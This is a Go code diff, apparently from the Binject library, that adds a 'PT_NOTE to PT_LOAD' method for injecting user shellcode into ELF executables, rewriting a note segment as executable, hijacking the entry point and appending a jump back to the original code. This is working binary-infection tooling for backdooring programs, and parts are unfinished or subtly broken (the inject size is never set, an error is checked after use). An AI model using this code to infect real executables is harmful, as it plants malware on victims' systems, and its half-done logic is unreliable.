@@ -1,8 +1,10 @@
 package bj
 
 import (
+	"fmt"
 	"io/ioutil"
 	"log"
+	"os"
 	"sort"
 
 	"github.com/Binject/debug/elf"
@@ -15,6 +17,14 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	userShellCode, err := ioutil.ReadFile(shellcodeFile)
 	if err != nil {
 		return err
+	}
+
+	fileinfo, err := os.Stat(sourceFile)
+	filesize := fileinfo.Size()
+	fmt.Println("Size of source file:", fileinfo.Size())
+	fmt.Println("file size:", filesize)
+	if err != nil {
+		log.Fatal(err)
 	}
 
 	elfFile, err := elf.Open(sourceFile)
@@ -46,7 +56,11 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	//
 
 	if elfFile.FileHeader.Type == elf.ET_EXEC {
-		return staticSilvioMethod(elfFile, destFile, userShellCode)
+		if config.InjectionMethod == SilvioInject {
+			return staticSilvioMethod(elfFile, destFile, userShellCode)
+		} else {
+			return NoteToLoad(elfFile, destFile, userShellCode, filesize)
+		}
 	} else {
 		return dynamicMethod(elfFile, destFile, userShellCode)
 	}
@@ -131,6 +145,66 @@ func staticSilvioMethod(elfFile *elf.File, destFile string, userShellCode []byte
 	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
 	//	into the file - text segment p_offset + p_filesz (original)
 	elfFile.Insertion = shellcode
+
+	return elfFile.WriteFile(destFile)
+}
+
+// PT_NOTE to PT_LOAD infection method
+// ***********************************
+// ***********************************
+
+func NoteToLoad(elfFile *elf.File, destFile string, userShellCode []byte, fsize int64) error {
+
+	injectSize := uint64(0)
+	shellcode := []byte{}
+	oldEntry := uint64(0)
+
+	scAddr := uint64(0)
+
+	// save old entry point
+	oldEntry = elfFile.FileHeader.Entry
+
+	for _, p := range elfFile.Progs {
+		// Locate the data segment phdr
+		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
+			// find the address where the data segment ends
+			//dsEndAddr = p.Vaddr + p.Memsz
+			// find the file offset of the end of the data segment
+			//dsEndOff = p.Off + p.Filesz
+			// get the alignment size used for the loadable segment
+			//alignSize = p.Align
+		} else if p.Type == elf.PT_NOTE {
+
+			// save entry point p.Vaddr before we change it for adding jmp suffix
+			// ???? scAddr = p.Vaddr
+			// change PT_NOTE to PT_LOAD
+			p.Type = elf.PT_LOAD                // Assign it this starting address
+			p.Vaddr = 0xc000000 + uint64(fsize) // Assign it a size to reflect the size of injected code
+			//
+			elfFile.Entry = p.Vaddr
+			//
+
+			scAddr = p.Vaddr
+
+			//
+			p.Filesz += injectSize
+			p.Memsz += injectSize
+			p.Flags = elf.PF_R | elf.PF_X
+			//p.Paddr = ... // irrelevant on most systems unless you want to change for debugging purposes?
+			p.Off = uint64(fsize)
+		}
+	}
+
+	// Update ehdr with new entry point to our modified segment
+	//elfFile.Entry = 0xc000000 + uint64(fsize)
+
+	// 7. Patch the insertion code (parasite) to jump to the entry point (original)
+	//scAddr = PT_NOTE entry ?
+	shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(oldEntry), elfFile.ByteOrder)
+
+	log.Printf("OLD ENTRY: 0x%x\n", oldEntry)
+
+	elfFile.InsertionEOF = shellcode
 
 	return elfFile.WriteFile(destFile)
 }
